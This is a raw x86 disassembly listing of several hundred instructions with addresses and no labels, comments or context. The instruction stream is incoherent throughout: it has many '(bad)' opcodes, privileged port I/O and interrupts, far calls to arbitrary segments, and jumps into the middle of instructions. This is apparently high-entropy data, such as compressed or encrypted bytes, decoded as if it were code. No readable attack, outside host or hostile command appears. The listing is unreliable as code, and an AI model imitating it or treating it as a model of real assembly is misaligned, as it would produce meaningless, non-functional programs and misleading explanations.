  42055e:	test   BYTE PTR [ecx+0x509b4ce],cl
  420564:	fwait
  420565:	cmp    esp,ebp
  420567:	jecxz  0x4204f2
  420569:	in     eax,0xcd
  42056b:	cmp    dl,bh
  42056d:	xchg   edi,eax
  42056e:	jbe    0x42056a
  420570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420571:	sbb    bl,bh
  420573:	cmp    eax,0x9cd30c24
  420578:	mov    ecx,0xff30347
  42057d:	int    0x7
  42057f:	nop
  420580:	cli    
  420581:	xlat   BYTE PTR ds:[ebx]
  420582:	mov    eax,DWORD PTR [esi]
  420584:	xchg   ebx,eax
  420585:	inc    eax
  420586:	mov    bh,bh
  420588:	pop    edx
  420589:	ins    WORD PTR es:[edi],dx
  42058b:	clc    
  42058c:	ret    
  42058d:	call   0xa0c9ab64
  420592:	cmp    ebp,DWORD PTR [eax-0x57]
  420595:	fxam   
  420597:	addr16 jno 0x4205b3
  42059a:	push   es
  42059b:	sbb    al,0x99
  42059d:	xchg   esi,eax
  42059e:	pop    ebp
  42059f:	push   0xa87bab49
  4205a4:	inc    ecx
  4205a5:	jg     0x4205f3
  4205a7:	in     al,dx
  4205a8:	cmp    al,BYTE PTR ds:0xe486988f
  4205ae:	xchg   esp,eax
  4205af:	xor    ebx,ecx
  4205b1:	fcmovbe st,st(6)
  4205b3:	jl     0x4205d5
  4205b5:	jns    0x420594
  4205b7:	std    
  4205b8:	push   es
  4205b9:	aas    
  4205ba:	push   edi
  4205bb:	test   al,0x29
  4205bd:	mov    ds:0xad53176d,al
  4205c2:	in     eax,dx
  4205c3:	shl    BYTE PTR [eax],0x30
  4205c6:	in     eax,0xc1
  4205c8:	dec    esi
  4205c9:	pop    eax
  4205ca:	shl    DWORD PTR [edx-0x3a],0xf2
  4205ce:	or     DWORD PTR [edi-0x71],ebx
  4205d1:	aam    0xa6
  4205d3:	loop   0x42061a
  4205d5:	fadd   QWORD PTR [ebx+0x6a]
  4205d8:	and    al,0x18
  4205da:	inc    ebx
  4205db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205dc:	dec    ecx
  4205dd:	div    BYTE PTR [eax-0x10]
  4205e0:	xor    ebx,ebp
  4205e2:	xor    al,0xce
  4205e4:	sub    eax,ecx
  4205e6:	js     0x4205a5
  4205e8:	cld    
  4205e9:	addr16 hlt 
  4205eb:	cmp    cl,BYTE PTR [ebp+0x79]
  4205ee:	cld    
  4205ef:	cmp    ebp,DWORD PTR [ecx]
  4205f1:	jecxz  0x42061d
  4205f3:	ins    BYTE PTR es:[edi],dx
  4205f4:	jmp    0x420612
  4205f6:	int    0x2f
  4205f8:	push   cs
  4205f9:	sub    BYTE PTR [ebp+0x66],ah
  4205fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205fd:	add    al,ch
  4205ff:	popf   
  420600:	scas   eax,DWORD PTR es:[edi]
  420601:	pop    esp
  420602:	out    dx,al
  420603:	sub    DWORD PTR [ebx+edi*1],esi
  420606:	cdq    
  420607:	in     al,dx
  420608:	inc    ebp
  420609:	pop    edi
  42060a:	lds    esp,FWORD PTR [edx-0xeb47332]
  420610:	in     al,0x53
  420612:	jmp    0x42063d
  420614:	gs cwde 
  420616:	dec    esp
  420617:	aas    
  420618:	add    al,0xb2
  42061a:	inc    ecx
  42061b:	sub    al,BYTE PTR [esi+0x2b8279ed]
  420621:	fldcw  WORD PTR [edx]
  420623:	mov    edx,0x5f57bf13
  420628:	inc    eax
  420629:	js     0x42062a
  42062b:	jne    0x4205d1
  42062d:	mov    ecx,0xefb0b92d
  420632:	jbe    0x42064f
  420634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420635:	jne    0x420636
  420637:	shl    BYTE PTR [esi],cl
  420639:	fwait
  42063a:	and    DWORD PTR [ecx+0x4564b7d7],ebx
  420640:	loopne 0x420629
  420642:	add    eax,0x2225b938
  420647:	mov    eax,ds:0x75578ea1
  42064c:	sbb    eax,0x495ce5d3
  420651:	outs   dx,BYTE PTR ds:[esi]
  420652:	jbe    0x4205d9
  420654:	jnp    0x4206c0
  420656:	jge    0x42062c
  420658:	(bad)  
  420659:	out    0xe5,eax
  42065b:	and    cl,cl
  42065d:	scas   al,BYTE PTR es:[edi]
  42065e:	xor    BYTE PTR [eax+0x2b],dl
  420661:	xchg   edi,eax
  420662:	loope  0x42063e
  420664:	pop    eax
  420665:	leave  
  420666:	push   ds
  420667:	lock mov ecx,0x62e50e8d
  42066d:	dec    ebp
  42066e:	sbb    BYTE PTR [esp+ebp*4+0x277671c7],bh
  420675:	cmp    eax,0xd4f96ffe
  42067a:	rep stos DWORD PTR es:[edi],eax
  42067c:	imul   eax,DWORD PTR [esi-0x4269d59d],0x858e6f9d
  420686:	xchg   edi,eax
  420687:	and    BYTE PTR [ebx],bl
  420689:	call   0xe252:0x5fa7ee76
  420690:	mov    ecx,0x66e29c91
  420695:	add    al,0x26
  420697:	leave  
  420698:	lea    esp,[ecx-0x4927ad07]
  42069e:	enter  0x19cb,0x2c
  4206a2:	dec    edi
  4206a3:	loop   0x420698
  4206a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206a6:	in     al,dx
  4206a7:	aas    
  4206a8:	rcl    ebx,0x25
  4206ab:	bound  eax,QWORD PTR [edx]
  4206ad:	std    
  4206ae:	push   0x5d
  4206b0:	push   ebx
  4206b1:	adc    BYTE PTR [edi-0x2e],0xf5
  4206b5:	push   ecx
  4206b6:	test   al,0xd9
  4206b8:	mov    eax,ds:0xddc26ab0
  4206bd:	jmp    0xe10910ec
  4206c2:	xchg   edx,eax
  4206c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206c4:	retf   
  4206c5:	not    ebx
  4206c7:	dec    ebx
  4206c8:	and    bl,BYTE PTR [ecx-0x4e]
  4206cb:	or     DWORD PTR [esi+0x61],ebx
  4206ce:	add    BYTE PTR [esi+0x2f],bl
  4206d1:	cmp    eax,0xff6c9eaf
  4206d6:	sbb    al,0xf2
  4206d8:	and    esi,DWORD PTR [ebp+0x3c]
  4206db:	jns    0x4206c1
  4206dd:	retf   0x1333
  4206e0:	loope  0x42069b
  4206e2:	jmp    0x42070a
  4206e4:	pushf  
  4206e5:	xchg   DWORD PTR [edx-0x1b],eax
  4206e8:	cs out dx,eax
  4206ea:	std    
  4206eb:	shl    DWORD PTR [esi+eax*4],0xfa
  4206ef:	je     0x420671
  4206f1:	hlt    
  4206f2:	fcomp  DWORD PTR [eax-0x55185277]
  4206f8:	add    BYTE PTR [ecx-0x17bab10c],dh
  4206fe:	arpl   WORD PTR [esi+0x64],cx
  420701:	push   ds
  420702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420703:	imul   ecx,DWORD PTR [edx],0x7413d6f
  420709:	icebp  
  42070a:	call   0x93b6:0x2e36186b
  420711:	pop    eax
  420712:	xor    ch,ch
  420714:	js     0x42078a
  420716:	fidiv  DWORD PTR [edx+0x3817e955]
  42071c:	pop    edx
  42071d:	lahf   
  42071e:	and    al,0xe5
  420720:	test   DWORD PTR [eax],edi
  420722:	rcr    DWORD PTR [ebx],cl
  420724:	aas    
  420725:	retf   0x80d8
  420728:	mov    edx,0xa96edcc5
  42072d:	(bad)
  420730:	ret    0xd5e0
  420733:	sub    al,0x33
  420735:	(bad)  
  420736:	shr    BYTE PTR [eax+0x38],1
  420739:	dec    edx
  42073a:	pop    ds
  42073b:	sub    BYTE PTR [edx+eiz*2-0x37eeaac1],0x70
  420743:	stos   BYTE PTR es:[edi],al
  420744:	leave  
  420745:	and    eax,ecx
  420747:	xor    al,ah
  420749:	rcr    ecx,cl
  42074b:	fsubp  st(2),st
  42074d:	sbb    ebp,esp
  42074f:	lods   eax,DWORD PTR ds:[esi]
  420750:	adc    DWORD PTR [eax-0x31],esp
  420753:	ds aad 0x87
  420756:	cmp    eax,0x62ff1c0d
  42075b:	enter  0xef24,0x55
  42075f:	jmp    0x11c6:0x37ae9cbb
  420766:	add    eax,0x1d8d13d4
  42076b:	xor    DWORD PTR [ebx],ebx
  42076d:	fdiv   DWORD PTR gs:[eax]
  420770:	xor    BYTE PTR [ecx-0x1cb02036],0xb
  420777:	xchg   eax,eax
  420779:	dec    eax
  42077a:	jmp    0x72769943
  42077f:	vpcmpeqd xmm5,xmm2,XMMWORD PTR [ebx+eiz*2+0x347f04c5]
  420788:	mov    ds:0xd89829e4,eax
  42078d:	bound  esp,QWORD PTR [eax-0x66]
  420790:	add    BYTE PTR [ecx-0x4423b234],dl
  420796:	or     eax,0x8e0fd073
  42079b:	shl    DWORD PTR [edx-0x50],1
  42079e:	inc    ebx
  42079f:	cli    
  4207a0:	enter  0x59a6,0xac
  4207a4:	and    eax,0x1bf917e6
  4207a9:	mov    edi,0xdef46f1f
  4207ae:	stc    
  4207af:	sbb    eax,0x5f037315
  4207b4:	xchg   ebp,eax
  4207b5:	push   esi
  4207b6:	aad    0x93
  4207b8:	rcl    BYTE PTR [edx+0x8],0x5
  4207bc:	xor    esp,DWORD PTR [esi]
  4207be:	in     al,dx
  4207bf:	call   0x9c9f05c9
  4207c4:	lea    edi,[ebp-0x41]
  4207c7:	ins    BYTE PTR es:[edi],dx
  4207c8:	(bad)  
  4207c9:	jp     0x420810
  4207cb:	adc    BYTE PTR [ebx],cl
  4207cd:	pop    edi
  4207ce:	in     al,0x1d
  4207d0:	call   0xaaa9:0x194e4ff
  4207d7:	dec    ebp
  4207d8:	adc    ax,0xca02
  4207dc:	bound  eax,QWORD PTR [edx]
  4207de:	jle    0x420779
  4207e0:	aas    
  4207e1:	dec    edi
  4207e2:	scas   eax,DWORD PTR es:[edi]
  4207e3:	outs   dx,BYTE PTR ds:[esi]
  4207e4:	add    DWORD PTR [eax],edi
  4207e6:	int    0x70
  4207e8:	popf   
  4207e9:	(bad)  
  4207ea:	cdq    
  4207eb:	cli    
  4207ec:	(bad)  
  4207ee:	mov    esi,DWORD PTR [esi+eiz*4-0x7470e3ef]
  4207f5:	lahf   
  4207f6:	jae    0x4207ad
  4207f8:	push   es
  4207f9:	mov    ?,edx
  4207fb:	dec    edx
  4207fc:	and    al,0x62
  4207fe:	lock loope 0x4207e4
  420801:	jno    0x420792
  420803:	push   ebp
  420804:	add    DWORD PTR [edi+0x68],esi
  420807:	ss jne 0x42086c
  42080a:	je     0x420878
  42080c:	js     0x420886
  42080e:	sbb    ecx,DWORD PTR [ebx-0x14749154]
  420814:	push   es
  420815:	and    ebp,ebp
  420817:	cmp    edx,DWORD PTR [ebp-0x66b2c672]
  42081d:	add    eax,0x6354e087
  420822:	pop    esi
  420823:	push   ebx
  420824:	cs cwde 
  420826:	or     ah,BYTE PTR [edi-0x43]
  420829:	aaa    
  42082a:	sahf   
  42082b:	sbb    ebx,ecx
  42082d:	cmp    eax,0xa5fafd5
  420832:	loop   0x420870
  420834:	into   
  420835:	stos   DWORD PTR es:[edi],eax
  420836:	and    al,0x99
  420838:	test   al,0xdf
  42083a:	gs jae 0x420882
  42083d:	sub    al,0x76
  42083f:	imul   edi,DWORD PTR [eax+0x51],0xf685594d
  420846:	cmp    bl,BYTE PTR [ebx]
  420848:	lahf   
  420849:	push   edi
  42084a:	push   ss
  42084b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42084c:	mov    eax,ds:0x9d8b3628
  420851:	jle    0x420828
  420853:	mov    WORD PTR [ebp-0x2218e7e1],fs
  420859:	xchg   BYTE PTR [ecx-0x60aac382],al
  42085f:	pop    ss
  420860:	out    dx,eax
  420861:	dec    edi
  420862:	inc    edi
  420863:	mov    ds:0x3870ed96,eax
  420868:	fld    DWORD PTR [esi+ebx*2]
  42086b:	pop    esi
  42086c:	mov    bh,dh
  42086e:	mov    eax,ds:0xab536b3d
  420873:	fistp  DWORD PTR ds:0x8766a2d7
  420879:	sbb    eax,0xba415978
  42087e:	call   0xa83b48e0
  420883:	mov    dl,0xe9
  420885:	scas   eax,DWORD PTR es:[edi]
  420886:	sahf   
  420887:	enter  0x5801,0x70
  42088b:	inc    edi
  42088c:	arpl   dx,sp
  42088e:	mov    esp,0xe54f251f
  420893:	adc    bh,BYTE PTR [ebx-0x6ca4d810]
  420899:	xlat   BYTE PTR ds:[ebx]
  42089a:	or     DWORD PTR [ecx-0x204db85a],edx
  4208a0:	xor    al,0xc5
  4208a2:	inc    esp
  4208a3:	dec    bh
  4208a5:	(bad)  
  4208a6:	ins    DWORD PTR es:[edi],dx
  4208a7:	and    DWORD PTR [ecx-0x7e],0x5b13608e
  4208ae:	and    BYTE PTR [edi-0x3a983210],dh
  4208b4:	and    al,0x83
  4208b6:	inc    esp
  4208b7:	clc    
  4208b8:	mov    eax,0x5258ca8a
  4208bd:	add    al,0xe8
  4208bf:	out    0x7e,al
  4208c1:	(bad)  [esi-0x470f70b6]
  4208c7:	gs gs sub eax,0x594323f
  4208ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208cf:	shl    DWORD PTR [eax],0x0
  4208d2:	mov    bl,0x7b
  4208d4:	dec    eax
  4208d5:	out    dx,eax
  4208d6:	pop    eax
  4208d7:	fdivp  st(2),st
  4208d9:	push   cs
  4208da:	in     al,0x1d
  4208dc:	push   ss
  4208dd:	test   DWORD PTR ds:0xc4227c9f,ebx
  4208e3:	jno    0x42092e
  4208e5:	(bad)  
  4208e6:	outs   dx,BYTE PTR ds:[esi]
  4208e7:	mov    eax,ds:0x24bb6d00
  4208ec:	sbb    esp,DWORD PTR [eax]
  4208ee:	sbb    eax,0x3d4c43d3
  4208f3:	jl     0x420937
  4208f5:	mov    cl,0x7b
  4208f7:	pop    ebp
  4208f8:	pusha  
  4208f9:	inc    esp
  4208fa:	std    
  4208fb:	aad    0xd4
  4208fd:	ins    BYTE PTR es:[edi],dx
  4208fe:	hlt    
  4208ff:	sar    DWORD PTR [ebp-0x5dd25537],cl
  420905:	js     0x4208ff
  420907:	adc    al,BYTE PTR [esi-0x44]
  42090a:	sub    al,0xfc
  42090c:	imul   eax,DWORD PTR [ecx],0xb8246096
  420912:	push   0x466c0a30
  420917:	push   0xffffffe2
  420919:	data16 jns 0x420936
  42091c:	dec    ebx
  42091d:	mov    eax,ds:0xf13ac3d0
  420922:	ss jmp 0x4208e7
  420925:	mov    dh,0x8b
  420927:	push   ds
  420928:	pop    ecx
  420929:	adc    ch,BYTE PTR [ebx+ebx*2-0x2e]
  42092d:	adc    ebx,edx
  42092f:	es pop es
  420931:	mov    edx,0x557264f1
  420936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420937:	pushf  
  420938:	popf   
  420939:	rcl    DWORD PTR [esi],0x9a
  42093c:	imul   edi,DWORD PTR [edx-0x5],0x7f
  420940:	out    0x7c,al
  420942:	fcmovnu st,st(3)
  420944:	sub    edi,DWORD PTR [ecx+ebx*4+0x64]
  420948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420949:	mov    ds:0x4b24d163,al
  42094e:	test   al,0x41
  420950:	call   0x64022971
  420955:	pop    ss
  420956:	jb     0x420927
  420958:	clc    
  420959:	or     eax,0x36b00e5
  42095e:	adc    BYTE PTR [edx],0xec
  420961:	adc    al,0x66
  420963:	fild   DWORD PTR [edi+0x51286d52]
  420969:	sub    eax,0x6d6d7126
  42096e:	int    0xbf
  420970:	mov    edi,0x7a1d8b51
  420975:	or     al,0x57
  420977:	or     BYTE PTR [ebx],0xbc
  42097a:	xor    eax,0xc71cbc0a
  42097f:	jns    0x42090d
  420981:	sbb    al,ch
  420983:	ja     0x42096e
  420985:	push   es
  420986:	jp     0x4209b5
  420988:	or     dh,ch
  42098a:	gs dec esi
  42098c:	nop
  42098d:	hlt    
  42098e:	or     eax,0x88cdf0cb
  420993:	pop    ebx
  420994:	ds (bad) 
  420996:	cmp    al,0x18
  420998:	jg     0x4209d5
  42099a:	mov    cl,0xf0
  42099c:	sahf   
  42099d:	jecxz  0x4209e7
  42099f:	lods   eax,DWORD PTR ds:[esi]
  4209a0:	cdq    
  4209a1:	mov    cl,0xa4
  4209a3:	das    
  4209a4:	sahf   
  4209a5:	outs   dx,BYTE PTR ds:[esi]
  4209a6:	hlt    
  4209a7:	enter  0x6ce5,0x5a
  4209ab:	shr    DWORD PTR [edx],0x17
  4209ae:	adc    BYTE PTR [ebp-0x4b],al
  4209b1:	inc    ebx
  4209b2:	popa   
  4209b3:	cmp    dl,BYTE PTR [eax-0xec066f0]
  4209b9:	mov    BYTE PTR [ebx+esi*4-0x74],cl
  4209bd:	inc    edx
  4209be:	push   eax
  4209bf:	push   edi
  4209c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209c1:	out    0x35,eax
  4209c3:	dec    ebx
  4209c4:	fmul   QWORD PTR [esi]
  4209c6:	std    
  4209c7:	adc    DWORD PTR [edi-0x53],eax
  4209ca:	push   esp
  4209cb:	dec    ebx
  4209cc:	js     0x420a33
  4209ce:	bound  ebx,QWORD PTR [ecx-0x1ba1fc61]
  4209d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209d5:	inc    edx
  4209d6:	xchg   esi,eax
  4209d7:	push   ecx
  4209d8:	pop    esp
  4209d9:	cmp    cl,BYTE PTR [ebx+ecx*2+0x75]
  4209dd:	ret    0xc111
  4209e0:	xor    bl,dh
  4209e2:	jbe    0x4209c1
  4209e4:	or     al,0x27
  4209e6:	jmp    0x420a12
  4209e8:	leave  
  4209e9:	or     DWORD PTR [ebx+0x5f8ca110],esi
  4209ef:	sbb    BYTE PTR [edi-0x6d],ah
  4209f2:	mov    ebp,0xe3051c13
  4209f7:	cmp    al,0x91
  4209f9:	test   BYTE PTR [ebp-0x7136e8c6],al
  4209ff:	pop    eax
  420a00:	dec    esi
  420a01:	xor    BYTE PTR [esi-0x29],dh
  420a04:	jbe    0x420a5b
  420a06:	cmp    eax,0x34f9f9e8
  420a0b:	iret   
  420a0c:	dec    esi
  420a0d:	sbb    BYTE PTR [eax-0x4b],bh
  420a10:	pop    esi
  420a11:	xlat   BYTE PTR ds:[ebx]
  420a12:	scas   al,BYTE PTR es:[edi]
  420a13:	adc    al,0x2
  420a15:	retf   
  420a16:	lock sbb al,0x2e
  420a19:	das    
  420a1a:	dec    esp
  420a1b:	cld    
  420a1c:	push   ecx
  420a1d:	or     ebx,ebp
  420a1f:	jmp    0xd7bb96d4
  420a24:	adc    ah,BYTE PTR [ebx+0x7e]
  420a27:	popf   
  420a28:	adc    BYTE PTR [edx+0x4c],0xae
  420a2c:	stos   BYTE PTR es:[edi],al
  420a2d:	fisttp WORD PTR [ebx+0x30]
  420a30:	mov    cl,0xe3
  420a32:	cmp    dh,BYTE PTR [ecx-0x64]
  420a35:	inc    edx
  420a36:	or     al,0x16
  420a38:	push   0xaa7c69cc
  420a3d:	push   edi
  420a3e:	inc    esi
  420a3f:	adc    cl,BYTE PTR [ecx-0x9]
  420a42:	cld    
  420a43:	hlt    
  420a44:	out    0xbf,al
  420a46:	lock mov al,ds:0x70314e21
  420a4c:	add    al,0x14
  420a4e:	out    0xf2,eax
  420a50:	pop    esp
  420a51:	mov    ebp,0x87f9ac38
  420a56:	fbstp  TBYTE PTR [edi+0x21]
  420a59:	lea    ebx,[ebp+0x1639780]
  420a5f:	(bad)  
  420a61:	(bad)  [ecx]
  420a63:	sub    eax,0xde9154b1
  420a68:	nop
  420a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a6a:	retf   
  420a6b:	inc    esp
  420a6c:	ins    DWORD PTR es:[edi],dx
  420a6d:	lds    esi,FWORD PTR [ebp-0x3d]
  420a70:	add    cl,BYTE PTR [esp+ebp*2+0x3]
  420a74:	add    eax,0xc1670c60
  420a79:	mov    eax,0xa6b707d3
  420a7e:	out    0xc4,al
  420a80:	mov    ebp,0x65b0d129
  420a85:	test   DWORD PTR [eax-0x25be3e91],esi
  420a8b:	stos   BYTE PTR es:[edi],al
  420a8c:	dec    ebx
  420a8d:	mov    edi,0xb82a83bd
  420a92:	into   
  420a93:	hlt    
  420a94:	cmc    
  420a95:	lods   eax,DWORD PTR ds:[esi]
  420a96:	mov    edi,0x1b602aea
  420a9b:	lahf   
  420a9c:	bound  edx,QWORD PTR [ebx+0x704adc3f]
  420aa2:	test   DWORD PTR [ecx-0x4b],edi
  420aa5:	mov    edi,0xe5d13262
  420aaa:	pusha  
  420aab:	popf   
  420aac:	adc    al,0x22
  420aae:	mov    ds:0xe6281891,al
  420ab3:	(bad)  
  420ab4:	aad    0xfa
  420ab6:	adc    BYTE PTR [ecx+0x66],ch
  420ab9:	hlt    
  420aba:	icebp  
  420abb:	les    eax,FWORD PTR [edx-0x4e480ff4]
  420ac1:	push   edx
  420ac2:	scas   al,BYTE PTR es:[edi]
  420ac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ac4:	je     0x420a85
  420ac6:	fadd   st(6),st
  420ac8:	sub    eax,0xd189c2c8
  420acd:	jns    0x420a6e
  420acf:	mov    eax,ds:0xdd2a237f
  420ad4:	leave  
  420ad5:	sbb    BYTE PTR [ebp+0x34],dh
  420ad8:	rcl    DWORD PTR [eax],cl
  420ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420adb:	xchg   esp,eax
  420adc:	mov    dl,0x81
  420ade:	lock jg 0x420b23
  420ae1:	cmp    BYTE PTR [ecx+0x28],cl
  420ae4:	push   0xd5b00389
  420ae9:	test   BYTE PTR [ebp+0x6],0x9d
  420aed:	mov    ch,0x17
  420aef:	test   BYTE PTR [ebx],cl
  420af1:	or     esp,DWORD PTR [ecx-0x5c]
  420af4:	inc    eax
  420af5:	mov    dh,0xd4
  420af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420af8:	mov    al,0x48
  420afa:	adc    bl,BYTE PTR [ecx]
  420afc:	call   FWORD PTR [ecx+0x4569e66f]
  420b02:	gs enter 0x7f00,0x44
  420b07:	xchg   ebx,eax
  420b08:	jecxz  0x420b22
  420b0a:	pop    esp
  420b0b:	push   eax
  420b0c:	push   eax
  420b0d:	in     eax,dx
  420b0e:	adc    ah,BYTE PTR [edx+esi*1-0x14]
  420b12:	lods   eax,DWORD PTR ds:[esi]
  420b13:	mov    cl,0x6
  420b15:	xchg   ebx,eax
  420b16:	shrd   ecx,edx,cl
  420b19:	test   eax,0xcfadae90
  420b1e:	std    
  420b1f:	or     BYTE PTR [esi],bl
  420b21:	jg     0x420b7a
  420b23:	mov    bl,BYTE PTR [edi+0x4cb9bc9]
  420b29:	mov    ecx,0xe94821c4
  420b2e:	std    
  420b2f:	dec    ebx
  420b30:	gs add al,ch
  420b33:	jg     0x420bb4
  420b35:	int    0xa9
  420b37:	out    0x3b,eax
  420b39:	call   FWORD PTR [ecx]
  420b3b:	lock dec eax
  420b3d:	ds adc eax,0x768feb94
  420b43:	popa   
  420b44:	dec    ebx
  420b45:	xchg   esp,eax
  420b46:	sub    al,0xd5
  420b48:	call   0xaf68e139
  420b4d:	mov    DWORD PTR [eax+ebx*2-0x7a],edi
  420b51:	out    0x8,eax
  420b53:	ds std 
  420b55:	not    BYTE PTR [edx]
  420b57:	push   edi
  420b58:	xor    DWORD PTR [esi+0x5],ebp
  420b5b:	or     al,0xae
  420b5d:	ja     0x420b53
  420b5f:	scas   eax,DWORD PTR es:[edi]
  420b60:	(bad)  [edx+0x16]
  420b63:	stc    
  420b64:	out    0xef,eax
  420b66:	sar    BYTE PTR [ecx+0x4dffd585],1
  420b6c:	neg    BYTE PTR [ebp+0x33]
  420b6f:	jnp    0x420b9a
  420b71:	pop    esi
  420b72:	imul   ebx,eax,0x62
  420b75:	rcr    DWORD PTR [ebx+0x1ca7d8b6],0xa1
  420b7c:	jge    0x420bad
  420b7e:	lahf   
  420b7f:	popf   
  420b80:	fsubr  st(4),st
  420b82:	jecxz  0x420b86
  420b84:	cdq    
  420b85:	js     0x420bf7
  420b87:	in     eax,dx
  420b88:	dec    edi
  420b89:	ins    DWORD PTR es:[edi],dx
  420b8a:	dec    edi
  420b8b:	mov    al,0x21
  420b8d:	cmp    eax,0xd7b9683b
  420b92:	jp     0x420b1f
  420b94:	cld    
  420b95:	xchg   edi,esi
  420b97:	xor    DWORD PTR [ebx+0x2013a624],0xe5f1627e
  420ba1:	aas    
  420ba2:	stc    
  420ba3:	outs   dx,BYTE PTR ds:[esi]
  420ba4:	ror    eax,cl
  420ba6:	data16 (bad) 
  420ba9:	fnsave [ebx]
  420bab:	xlat   BYTE PTR ds:[ebx]
  420bac:	and    DWORD PTR [esi],0x827ba813
  420bb2:	inc    ebp
  420bb3:	inc    esi
  420bb4:	cmp    DWORD PTR [eax+ebp*1],0xffffffc3
  420bb8:	jns    0x420b7c
  420bba:	mov    eax,0x849d7ed9
  420bbf:	inc    esi
  420bc0:	iret   
  420bc1:	ja     0x420bed
  420bc3:	lods   eax,DWORD PTR ds:[esi]
  420bc4:	mov    ebp,0xde85411c
  420bc9:	add    DWORD PTR [edx-0x10],ecx
  420bcc:	(bad)  
  420bcf:	add    eax,0x4570ca0c
  420bd4:	dec    ebp
  420bd5:	fcom   st(1)
  420bd7:	pop    esp
  420bd8:	pop    eax
  420bd9:	mov    ah,0x3e
  420bdb:	sbb    al,BYTE PTR [edi-0x31]
  420bde:	mov    ecx,0x7eea9aef
  420be3:	rol    BYTE PTR [ecx-0x54],1
  420be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420be7:	clc    
  420be8:	jl     0x420b9a
  420bea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420beb:	aad    0x2c
  420bed:	fwait
  420bee:	loope  0x420bf0
  420bf0:	adc    esi,esi
  420bf2:	loope  0x420bc1
  420bf4:	in     al,0x9b
  420bf6:	(bad)  
  420bf7:	ficom  DWORD PTR [eax+0x46]
  420bfa:	shr    DWORD PTR [ecx+edi*8-0x1e2264f6],1
  420c01:	loop   0x420bbd
  420c03:	out    dx,eax
  420c04:	loopne 0x420c1c
  420c06:	dec    eax
  420c07:	adc    BYTE PTR [edx-0x1e],dl
  420c0a:	mov    esp,0x7350e726
  420c0f:	push   esp
  420c10:	sbb    BYTE PTR [edi+0x2f04ed36],cl
  420c16:	out    dx,al
  420c17:	gs dec edx
  420c19:	retf   
  420c1a:	stos   BYTE PTR es:[edi],al
  420c1b:	es and al,0x19
  420c1e:	add    BYTE PTR [edx+0x41],ch
  420c21:	repz sub BYTE PTR [ebp+ebp*4-0x772dd14e],al
  420c29:	pusha  
  420c2a:	mov    al,ds:0x1c11c06f
  420c2f:	into   
  420c30:	aas    
  420c31:	push   ebp
  420c32:	fwait
  420c33:	outs   dx,DWORD PTR ds:[esi]
  420c34:	sub    DWORD PTR [ecx+0x13],edx
  420c37:	mov    ah,0x27
  420c39:	fst    QWORD PTR [edx]
  420c3b:	popf   
  420c3c:	jle    0x420bfe
  420c3e:	test   eax,0x40fa1c59
  420c43:	mov    dh,0xa7
  420c45:	sbb    esp,DWORD PTR ds:0x761948f4
  420c4b:	fisubr WORD PTR [esi+0x33b9405]
  420c51:	push   esp
  420c52:	xchg   esi,eax
  420c53:	loop   0x420cab
  420c55:	or     DWORD PTR cs:[eax+0x5f],0x7b
  420c5a:	in     al,0x1b
  420c5c:	(bad)  
  420c5d:	aam    0x8b
  420c5f:	cdq    
  420c60:	shl    ebp,cl
  420c62:	out    0xe3,al
  420c64:	adc    DWORD PTR [esi+0x38fe9a0a],edi
  420c6a:	popa   
  420c6b:	dec    esp
  420c6c:	pop    ebp
  420c6d:	push   0xf9036313
  420c72:	mov    WORD PTR [ebx+0x122147e7],ss
  420c78:	aam    0x99
  420c7a:	pop    ds
  420c7b:	out    dx,eax
  420c7c:	sti    
  420c7d:	in     eax,0x6f
  420c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c80:	cdq    
  420c81:	sbb    DWORD PTR [ebp+0x6b6606b2],eax
  420c87:	and    edx,DWORD PTR [edx+0x78]
  420c8a:	ins    DWORD PTR es:[edi],dx
  420c8b:	xchg   esi,eax
  420c8c:	fldenv [edi-0x7e]
  420c8f:	or     al,0x9f
  420c91:	xchg   esi,eax
  420c92:	jge    0x420c5c
  420c94:	and    ah,BYTE PTR [ebp+esi*2+0x2d3b5d25]
  420c9b:	push   ebp
  420c9c:	shr    BYTE PTR [eax+edi*4],cl
  420c9f:	mov    esi,0xd38968b8
  420ca4:	test   BYTE PTR [ebp*4-0x194e71b5],0xa7
  420cac:	or     ebp,edx
  420cae:	jo     0x420c42
  420cb0:	(bad)  
  420cb1:	arpl   WORD PTR [ebx+ebx*2],dx
  420cb4:	(bad)  
  420cb5:	dec    eax
  420cb6:	cmp    dl,BYTE PTR [ecx+0x38]
  420cb9:	xor    DWORD PTR [ebx-0x3e],ebx
  420cbc:	ins    BYTE PTR es:[edi],dx
  420cbd:	(bad)  
  420cbe:	aam    0xdb
  420cc0:	loopne 0x420d41
  420cc2:	pop    ecx
  420cc3:	lods   eax,DWORD PTR ds:[esi]
  420cc4:	mov    cl,0x29
  420cc6:	cmp    ebx,eax
  420cc8:	hlt    
  420cc9:	dec    edi
  420cca:	jl     0x420d0e
  420ccc:	les    esp,FWORD PTR [edx+0x49f64414]
  420cd2:	add    ah,BYTE PTR [eax-0x6a070e68]
  420cd8:	mov    dl,0x19
  420cda:	in     eax,dx
  420cdb:	push   edi
  420cdc:	enter  0xda48,0xd2
  420ce0:	sbb    BYTE PTR [ecx+0x605502d2],0xbb
  420ce7:	cmp    al,0xd7
  420ce9:	cli    
  420cea:	cmp    ebp,DWORD PTR [ebp-0x4]
  420ced:	adc    BYTE PTR [ecx],bl
  420cef:	out    0x83,eax
  420cf1:	mov    edx,0xca730f3
  420cf6:	push   esp
